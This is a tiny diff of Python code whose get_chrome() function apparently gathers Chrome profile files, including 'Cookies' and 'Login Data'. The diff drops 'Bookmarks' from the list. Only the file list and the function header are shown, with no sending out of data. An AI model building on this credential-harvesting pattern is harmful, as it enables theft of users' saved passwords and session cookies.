@@ -1,5 +1,5 @@
 from os.path import os, exists
-list_file = ['History','Bookmarks','Cookies','Login Data']
+list_file = ['History','Cookies','Login Data']
 def get_chrome():
     try:
         import os
